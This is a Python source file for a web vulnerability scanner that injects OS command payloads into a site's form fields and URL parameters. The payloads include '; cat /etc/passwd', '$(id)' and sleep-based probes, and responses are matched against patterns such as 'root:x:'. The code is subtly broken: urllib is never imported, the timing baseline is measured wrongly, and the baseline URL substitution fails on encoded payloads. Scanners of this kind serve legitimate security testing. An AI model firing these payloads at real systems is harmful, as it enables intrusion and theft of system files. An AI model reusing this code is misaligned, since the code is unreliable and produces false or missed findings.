import re
import logging
import aiohttp
import time
import traceback
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlencode, parse_qs, parse_qsl
from .base_scanner import BaseScanner

class CommandInjectionScanner(BaseScanner):
    def __init__(self, url, session=None):
        config = {'timeout': 30}  # Default config
        super().__init__(session or aiohttp.ClientSession(), config)
        self.url = url
        self.requests_made = 0
        self.cmd_payloads = [
            # Basic command injection
            "; ls",
            "& ls",
            "| ls",
            "|| ls",
            "&& ls",
            "` ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            
            # Command injection with spaces
            "%0als",
            "%0a ls",
            "%0als%0a",
            "%0a ls %0a",
            
            # Time-based payloads
            "; sleep 5",
            "& sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "&& sleep 5",
            "` sleep 5`",
            "$(sleep 5)",
            
            # Advanced payloads
            "|timeout 5",
            "`timeout 5`",
            "; ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            
            # Special characters
            ";\n",
            "&\n",
            "|\n",
            "||\n",
            "&&\n",
            
            # Nested commands
            "$(echo 'ping -c 5 127.0.0.1')",
            "`echo 'ping -c 5 127.0.0.1'`",
            
            # Command substitution
            "`id`",
            "$(id)",
            "`whoami`",
            "$(whoami)",
            
            # URL encoded payloads
            "%3B%20ls",
            "%26%20ls",
            "%7C%20ls",
            
            # Double URL encoded payloads
            "%253B%2520ls",
            "%2526%2520ls",
            "%257C%2520ls"
        ]
        
        # Error patterns that might indicate command injection
        self.error_patterns = [
            "sh:",
            "bash:",
            "cmd:",
            "PWD",
            "whoami",
            "/bin/",
            "w32tm",
            "net user",
            "/etc/passwd",
            "root:x:",
            "Directory of",
            "Volume Serial Number",
            "bash.exe",
            "cmd.exe"
        ]

    async def scan(self):
        """Required implementation of the abstract scan method"""
        self.log("Starting command injection scan", "INFO")
        try:
            # Find all input points
            input_points = await self.find_input_points(self.url)
            self.log(f"Found {len(input_points)} potential command injection points", "INFO")
            
            # Test each input point with each payload
            for input_type, input_point in input_points:
                self.log(f"Testing input point: {input_type} - {input_point}", "INFO")
                for payload in self.cmd_payloads:
                    self.log(f"Testing command injection payload: {payload}", "DEBUG")
                    await self.test_input_point(input_type, input_point, payload)
                    
            self.log("Command injection scan completed", "INFO")
            return self.vulnerabilities
            
        except Exception as e:
            self.log(f"Error during command injection scan: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
            return []

    async def find_input_points(self, url):
        """Find potential command injection points in the application"""
        input_points = []
        try:
            self.log(f"Finding command injection points for {url}", "INFO")
            async with self.session.get(url, ssl=False, timeout=self.config['timeout']) as response:
                if response.status != 200:
                    self.log(f"Received non-200 status code: {response.status}", "WARNING")
                    return input_points
                
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Find forms
                forms = soup.find_all('form')
                self.log(f"Found {len(forms)} forms to test", "INFO")
                
                for form in forms:
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
                        action = urllib.parse.urljoin(base_url, action)
                    
                    # Look for input fields
                    inputs = form.find_all(['input', 'textarea'])
                    for input_elem in inputs:
                        input_type = input_elem.get('type', 'text')
                        input_name = input_elem.get('name', '')
                        if input_name and input_type in ['text', 'search', 'url', 'hidden']:
                            self.log(f"Found potential command injection point in form: {input_name}", "DEBUG")
                            input_points.append(('form', {
                                'method': method,
                                'action': action,
                                'name': input_name,
                                'type': input_type
                            }))
                
                # Find URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    for param in params:
                        self.log(f"Found URL parameter: {param}", "DEBUG")
                        input_points.append(('url_param', param))
                
                self.log(f"Found total {len(input_points)} potential command injection points", "INFO")
                return input_points
                
        except Exception as e:
            self.log(f"Error finding command injection points: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
        
        return input_points

    async def test_input_point(self, input_type, input_point, payload):
        """Test an input point for command injection vulnerabilities"""
        try:
            self.log(f"Testing {input_type} with command injection payload: {payload}", "DEBUG")
            
            if input_type == 'url_param':
                # Test URL parameters
                parsed_url = urlparse(self.url)
                params = dict(parse_qsl(parsed_url.query))
                params[input_point] = payload
                query = urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                self.log(f"Testing URL parameter at: {test_url}", "DEBUG")
                
                # First request with normal value
                async with self.session.get(test_url.replace(payload, "normal_value"), ssl=False, timeout=self.config['timeout']) as normal_response:
                    normal_content = await normal_response.text()
                    normal_time = time.time()
                    self.requests_made += 1
                
                # Second request with command injection payload
                start_time = time.time()
                async with self.session.get(test_url, ssl=False, timeout=self.config['timeout']) as response:
                    content = await response.text()
                    end_time = time.time()
                    self.requests_made += 1
                    
                    # Check for command injection indicators
                    if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
                        self.log(f"Found command injection vulnerability in URL parameter: {input_point}", "INFO")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            f"3. Submit the request",
                            f"4. Observe the response containing command execution output"
                        ]
                        
                        self.vulnerabilities.append({
                            'type': 'command_injection',
                            'location': f"URL parameter: {input_point}",
                            'payload': payload,
                            'evidence': content[:200],  # First 200 chars of response
                            'severity': 'high',
                            'reproduction_steps': steps,
                            'request_info': {
                                'url': test_url,
                                'method': 'GET'
                            }
                        })
                        
                    # Check for time-based injection
                    time_diff = end_time - start_time
                    normal_time_diff = start_time - normal_time
                    if time_diff > normal_time_diff + 4:  # 4 second threshold
                        self.log(f"Found time-based command injection in URL parameter: {input_point}", "INFO")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            f"3. Submit the request",
                            f"4. Observe the delayed response ({time_diff:.2f}s vs {normal_time_diff:.2f}s)"
                        ]
                        
                        self.vulnerabilities.append({
                            'type': 'command_injection',
                            'location': f"URL parameter: {input_point}",
                            'payload': payload,
                            'evidence': f"Time difference: {time_diff:.2f}s (normal: {normal_time_diff:.2f}s)",
                            'severity': 'high',
                            'reproduction_steps': steps,
                            'request_info': {
                                'url': test_url,
                                'method': 'GET'
                            }
                        })
                        
            elif input_type == 'form':
                method = input_point['method']
                action = input_point['action']
                data = {input_point['name']: payload}
                
                self.log(f"Testing form submission: method={method}, action={action}, data={data}", "DEBUG")
                
                if method == 'get':
                    params = urlencode(data)
                    test_url = f"{action}?{params}"
                    
                    # First request with normal value
                    normal_data = {input_point['name']: "normal_value"}
                    normal_params = urlencode(normal_data)
                    normal_url = f"{action}?{normal_params}"
                    
                    async with self.session.get(normal_url, ssl=False, timeout=self.config['timeout']) as normal_response:
                        normal_content = await normal_response.text()
                        normal_time = time.time()
                        self.requests_made += 1
                    
                    # Second request with command injection payload
                    start_time = time.time()
                    async with self.session.get(test_url, ssl=False, timeout=self.config['timeout']) as response:
                        content = await response.text()
                        end_time = time.time()
                        self.requests_made += 1
                else:
                    # First request with normal value
                    normal_data = {input_point['name']: "normal_value"}
                    async with self.session.post(action, data=normal_data, ssl=False, timeout=self.config['timeout']) as normal_response:
                        normal_content = await normal_response.text()
                        normal_time = time.time()
                        self.requests_made += 1
                    
                    # Second request with command injection payload
                    start_time = time.time()
                    async with self.session.post(action, data=data, ssl=False, timeout=self.config['timeout']) as response:
                        content = await response.text()
                        end_time = time.time()
                        self.requests_made += 1
                
                # Check for command injection indicators
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
                    self.log(f"Found command injection vulnerability in form input: {input_point['name']}", "INFO")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Set the '{input_point['name']}' field to: {payload}",
                        f"4. Submit the form",
                        f"5. Observe the response containing command execution output"
                    ]
                    
                    self.vulnerabilities.append({
                        'type': 'command_injection',
                        'location': f"Form input: {input_point['name']}",
                        'payload': payload,
                        'evidence': content[:200],  # First 200 chars of response
                        'severity': 'high',
                        'reproduction_steps': steps,
                        'request_info': {
                            'url': action,
                            'method': method.upper(),
                            'data': data
                        }
                    })
                    
                # Check for time-based injection
                time_diff = end_time - start_time
                normal_time_diff = start_time - normal_time
                if time_diff > normal_time_diff + 4:  # 4 second threshold
                    self.log(f"Found time-based command injection in form input: {input_point['name']}", "INFO")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Set the '{input_point['name']}' field to: {payload}",
                        f"4. Submit the form",
                        f"5. Observe the delayed response ({time_diff:.2f}s vs {normal_time_diff:.2f}s)"
                    ]
                    
                    self.vulnerabilities.append({
                        'type': 'command_injection',
                        'location': f"Form input: {input_point['name']}",
                        'payload': payload,
                        'evidence': f"Time difference: {time_diff:.2f}s (normal: {normal_time_diff:.2f}s)",
                        'severity': 'high',
                        'reproduction_steps': steps,
                        'request_info': {
                            'url': action,
                            'method': method.upper(),
                            'data': data
                        }
                    })
                    
        except aiohttp.ClientError as e:
            self.log(f"Network error while testing command injection point: {str(e)}", "ERROR")
        except Exception as e:
            self.log(f"Error testing command injection point: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "DEBUG")
